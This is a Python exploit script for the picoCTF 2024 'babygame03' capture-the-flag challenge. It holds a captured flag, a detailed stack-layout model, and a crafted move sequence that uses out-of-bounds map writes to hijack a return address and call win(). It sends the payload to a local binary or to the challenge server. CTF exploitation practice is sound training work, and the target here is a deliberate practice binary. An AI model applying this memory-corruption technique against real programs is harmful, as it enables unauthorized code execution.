#!/usr/bin/env python3
# 446 - babygame03  (Binary Exploitation, picoCTF 2024)
# Flag: academy{gamer_leveluP_8fb078e2}
# Write-up: ../../../writeups/binary-exploitation/446-babygame03.md
# This is the script that produced the flag; historical variants are in archive/.
#
# picoCTF 2024 babygame03 (CyLab instance 446)
#
# STATUS: WORKING.  Verified locally (prints FLAG{TEST}) and remotely
#         -> academy{gamer_leveluP_8fb078e2}   (instance chatelaine.cylabacademy.net 24472)
#         usage: python3 _z_446_solve.py local|remote   (BG03_HOST / BG03_PORT override the remote)
#
# Model (verified by measurement):
#   main frame: level int @ flat -19 (map base = ebp-0xa99), player{row,col,lives} @ -15,-11,-7,
#               map[2700] @ 0..2699, rounds_won @ 2701.
#   move_player: UNCONDITIONALLY writes '.' at map[90*row+col] of the OLD position,
#                then moves, checks '#' at the NEW position, then writes player_tile there.
#   => a byte we choose only survives at the LAST position visited; every earlier visited
#      byte becomes '.' (0x2e).  Because of that, level can never be written to 5 with the
#      byte primitive (leaving flat -19 rewrites it to '.'), so level 5 must come from main's
#      own level-up code (`level++`), which is reachable by hijacking move_player's return
#      address low byte (flat -51, 0x0804992c -> 0x08049982).
#   Each level-up hijack skips main's `add esp,0x10` so main's esp drops 16 bytes and the
#   return-address slot moves down by 16 bytes (flat -51, -67, -83, -99, -115).
#
# Round k: arrive on flat R(k) = -51-16k with tile 0x82 (level-up) or 0xfe (call win(&level)).
#   - arrival must come from R+90 or R-90 (R+-1 are the ret addr / saved-ebp bytes -> fatal)
#   - paths avoid the fatal flats: ret bytes R+1..R+3, saved ebp bytes R-1..R-3, row (-14..-12),
#     col (-10..-8), level (-19..-16), and never arrive on lives byte3 (-4) with a high byte.

import sys, re, socket, time

# ---------- per-round move sequences ----------
def build():
    """Round k (0-based) uses return-address slot flat R(k) = -51-16k.
    Frame of round k, relative to R:
        [R..R+3]    saved return address (0x0804992c)  -> only byte R is usable
        [R+4..R+7]  player* arg        (LIVE: re-read at the lives decrement)
        [R+8..R+11] char arg           (dead after entry)
        [R+12..R+15] map* arg          (LIVE: re-read for every map access)
        [R+16..R+19] level* arg        (dead for normal moves)
        [R-4..R-1]  saved ebp          (bytes 1..3 fatal)
        [R-8..R-5]  saved esi, [R-12..R-9] saved ebx, [R-16..R-13] char local,
        [R-20..R-17] padding, esp = R-28 and below = free stack
    An arrival on R must come from R+90 or R-90 (R+-1 are the ret/saved-ebp bytes)."""
    s = bytearray()
    # ---- round 0: level 1 -> 2.  R=-51.  Fatal: -50..-44, -39..-36, -55..-52.
    # Lives boost: arrive on flat -4 (lives byte3) with '@'=0x40 => lives = 0x40000032.
    # Then walk row 1 to col -51 (flat 39) and step 'w' onto flat -51 with tile 0x82.
    s += b'ss' + b'a' * 8 + b'w' * 5 + b'w' + b's' + b'a' * 47
    s += b'l\x82' + b'w'
    # ---- round 1: level 2 -> 3.  R=-67.  Fatal: -66..-60, -51..-48, -70..-68.
    # Descend at col 4 (flat -86 is padding, safe), then walk row -2 to col 23 (flat -157)
    # and step 's' onto flat -67.
    s += b'w' * 6 + b'd' * 19 + b's'
    # ---- round 2: level 3 -> 4.  R=-83.  Fatal: -82..-76, -67..-64, -86..-84.
    # Descend at col 17 (flat -73 = dead char-arg slot), walk row -2 to col 7 (flat -173),
    # step 's' onto flat -83.
    s += b'd' * 13 + b'w' * 6 + b'a' * 10 + b's'
    # ---- round 3: level 4 -> 5.  R=-99.  Fatal: -98..-92, -87..-84, -102..-100.
    # descend col 4 to row 0, go right to col 10 (flat -80 = dead level-arg slot),
    # drop to row -2 (flat -170, free stack), walk to col -9 (flat -189), step 's' onto -99.
    s += b'w' * 4 + b'd' * 6 + b'w' * 2 + b'a' * 19 + b's'
    # ---- round 4: level 5 -> win(&level).  R=-115.  Fatal: -114..-108, -103..-100, -118..-116.
    # go down to row 6, left to col -25, up to (0,-25) = flat -25 (main's frame padding),
    # set tile 0xfe, step 'w' onto flat -115 -> 0x080499fe -> win(&level==5).
    s += b'ss' + b'a' * 29 + b'w' * 5 + b'w' + b'l\xfe' + b'w'
    return bytes(s)

SEQ = build()

# ---------- local ----------
def run_local(seq, timeout=30.0, maxbytes=4000000):
    import subprocess, os, select
    here = os.path.dirname(os.path.abspath(__file__))
    p = subprocess.Popen(['./game'], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.DEVNULL, cwd=here)
    out = bytearray()
    try:
        p.stdin.write(seq); p.stdin.flush()
    except Exception:
        pass
    t0 = time.time(); fd = p.stdout.fileno()
    while time.time() - t0 < timeout and len(out) < maxbytes:
        r, _, _ = select.select([fd], [], [], 0.2)
        if r:
            c = os.read(fd, 65536)
            if not c:
                break
            out += c
        elif p.poll() is not None:
            break
    try: p.kill()
    except Exception: pass
    try: p.wait(timeout=2)
    except Exception: pass
    return bytes(out), p.returncode

# ---------- remote ----------
import os as _os
HOST = _os.environ.get('BG03_HOST', 'chatelaine.cylabacademy.net')
PORT = int(_os.environ.get('BG03_PORT', '24472'))

def run_remote(seq, host=HOST, port=PORT, timeout=40.0):
    s = socket.create_connection((host, port), timeout=8)
    s.settimeout(0.5)
    s.sendall(seq)
    out = bytearray()
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            c = s.recv(65536)
            if not c:
                break
            out += c
            if b'}' in out and (b'academy{' in out or b'picoCTF{' in out):
                break
        except socket.timeout:
            pass
        except Exception:
            break
    try: s.close()
    except Exception: pass
    return bytes(out)

def show(tag, out, rc=None):
    s = out.decode('latin1', 'replace')
    lev = re.findall(r'Level: (-?\d+)', s)
    liv = re.findall(r'Lives left: (-?\d+)', s)
    pos = re.findall(r'Player position: (-?\d+) (-?\d+)', s)
    flag = re.findall(r'(?:academy|picoCTF|FLAG)\{[^}\n]*\}', s)
    print(f'[{tag}] rc={rc} bytes={len(out)} maps={len(lev)}')
    print(f'[{tag}] levels seen: {sorted(set(lev))}  tail={lev[-3:]}')
    print(f'[{tag}] lives seq: {liv[:3]} ... {liv[-3:]}')
    print(f'[{tag}] pos seq: {pos[:2]} ... {pos[-2:]}')
    for m in ('You win', 'obstacle', 'Game over', 'Next level'):
        if m in s:
            print(f'[{tag}] MARKER {m!r}')
    print(f'[{tag}] FLAG: {flag[:3]}')
    return s

if __name__ == '__main__':
    mode = sys.argv[1] if len(sys.argv) > 1 else 'local'
    print('SEQ len', len(SEQ), '->', SEQ)
    if mode in ('local', 'both'):
        out, rc = run_local(SEQ)
        show('local', out, rc)
    if mode in ('remote', 'both'):
        out = run_remote(SEQ)
        show('remote', out)
